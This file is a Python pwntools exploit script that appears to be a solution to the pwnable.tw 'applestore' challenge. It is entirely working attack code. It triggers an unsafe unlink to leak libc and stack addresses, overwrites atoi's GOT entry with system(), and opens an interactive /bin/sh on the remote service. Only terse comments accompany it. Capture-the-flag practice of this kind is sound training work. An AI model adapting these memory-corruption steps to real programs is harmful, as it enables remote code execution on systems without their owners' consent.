from pwn import *

s = remote("chall.pwnable.tw", 10104)

s.recv()
def iphone8():
	for i in range(6):
		s.sendline("2")   # add
		s.recv()
		s.sendline("1")   # iphone6
		s.recv()
	for i in range(20):
		s.sendline("2")   # add
		s.recv()
		s.sendline("2")   # iphone 6 plus
		s.recv()
	s.sendline("5")     # checkout
	s.recv()
	s.sendline("y")     # yes
	s.recv()

got_atoi = 0x0804b040
got_libc = 0x0804b034
mycart = 0x0804b068	
completed = 0x0804b064

# setup to get iphone8
iphone8()
# delete to leak libc_start_main address
payload1 = p32(0x0804b033) + b"\x00"*8 + p32(mycart)    # delete
s.sendline(payload1)
s.recv()
s.sendline("28")

# leaking system address and environ address
arev = s.recv()
libc_addr = u32(arev[11:15])
sys_addr = libc_addr - 0x00018540 + 0x0003a940
# libc_environment
# with environ address we will have address of stack
environ_addr = libc_addr - 0x00018540 + 0x001b1dbc


iphone8()
# delete to set environ_addr to completed memory
payload2 = p32(0x0804b033) + b"\x00"*4 + p32(completed-0xc) + p32(environ_addr)
s.sendline(payload2)
s.recv()
s.sendline("28")
s.recv()

# set completed as fd in the 28th element in linked list
payload3 = p32(0x0804b034) + b"\x00"*4 + p32(completed) + p32(mycart)
# call cart() function to list all element in the linked list 
s.sendline(payload3)
payload4 = b"ya" + p32(0x0804b030) 
s.sendline(payload4)
s.recvuntil("29: ")
# we care about the 29th element because it will print stack environment address
stack_env = u32(s.recv()[:4])
ebp_delete = stack_env - 0x104 

# delete to turn into the beginning
payload5 = p32(0x0804b033) + b"\x00"*8 + p32(mycart)
s.sendline(payload5)
s.recv()
s.sendline("28")
s.recv()


iphone8()
# delete to set ebp value point to GOT when leaving delete() function
# ebp_in_GOT
payload6 = p32(0x0804b033) + b"\x00"*4 + p32(ebp_delete - 0xc) + p32(got_atoi + 0x22)
s.sendline(payload6)
s.recv()
s.sendline("28")
s.recv()

# override got atoi() with system() and execute with payload7 argument
payload7 = p32(sys_addr) + b";/bin/sh"
s.sendline(payload7)

s.interactive()

s.close()
